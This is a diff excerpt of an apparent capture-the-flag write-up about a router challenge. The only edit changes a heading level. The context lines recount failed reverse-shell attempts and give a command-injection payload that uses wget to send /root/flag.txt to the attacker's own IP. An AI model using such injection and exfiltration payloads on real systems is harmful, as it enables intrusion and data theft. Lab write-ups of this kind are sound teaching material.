@@ -85,7 +85,7 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 > I was not able to launch a shell , i tried `netcat` `busybox bash` `telnet` `wget` but still i was not able to get a `reverse shell` , i thought the firewall blocking it , so i turned off it in the router panel , still the i was not getting any connection back , if you managed to pop up a shell , please let me know how.
 {: .prompt-tip }
 
-# Reading the Flag
+## Reading the Flag
 
 `Busybox` has `wget` and i guessed the flag might be located in `/root/flag.txt` so i used `wget` to read the flag. In the `Command Injection` i used the payload `;wget http://10.17.9.139/$(cat /root/flag.txt)` (URL encoded) . 
 
